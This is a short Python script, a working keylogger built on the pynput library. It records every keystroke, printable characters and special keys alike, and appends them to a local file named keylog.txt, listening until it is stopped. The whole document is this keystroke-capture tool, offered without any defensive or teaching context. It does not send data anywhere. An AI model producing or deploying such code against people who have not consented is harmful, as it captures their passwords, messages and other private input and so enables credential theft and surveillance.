from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    """Callback function to log keys when pressed."""
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)  # Log printable characters
            else:
                f.write(f" [{key}] ")  # Log special keys
    except Exception as e:
        print(f"Error: {e}")

def start_keylogger():
    """Starts the keylogger."""
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()  # Keep listening indefinitely

if __name__ == "__main__":
    print("Keylogger started... (Press CTRL+C to stop)")
    start_keylogger()